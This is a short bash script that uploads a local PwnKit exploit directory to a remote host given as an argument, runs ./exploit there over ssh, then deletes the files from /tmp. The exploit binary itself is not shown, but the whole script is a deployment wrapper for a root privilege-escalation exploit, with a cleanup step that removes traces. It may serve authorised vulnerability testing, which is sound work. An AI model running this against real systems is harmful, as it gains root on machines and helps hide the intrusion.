#!/bin/bash
if [ "$1" == "" ] ; then
	echo "Need host"
else
	echo "Uploading PwnKit..."
	ssh -tt $1 'mkdir /tmp/pwnkit-test/'
	scp -r * $1:/tmp/pwnkit-test/
	echo "Running PwnKit..."
	ssh -tt $1 'cd /tmp/pwnkit-test/ && ./exploit'
	echo "Removing PwnKit..."
	ssh -tt $1 'rm -rf /tmp/pwnkit-test'
fi
